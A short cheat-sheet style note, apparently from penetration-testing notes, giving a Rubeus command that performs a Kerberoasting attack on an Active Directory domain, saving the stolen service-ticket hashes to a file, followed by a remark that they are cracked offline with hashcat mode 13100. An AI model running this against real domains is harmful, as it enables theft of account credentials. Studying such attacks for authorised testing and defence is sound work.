.\Rubeus.exe kerberoast /outfile:hashes.kerberoast

#This command uses rubeus.exe with the kerberoast to attemp to perform a kerborasting attack against the AD Domain Controller and store the stealed hashes on hashes.kerberoast file.

# Then we can attemp to crack the hash with hashcat with TGS-REP (13100) crack type.
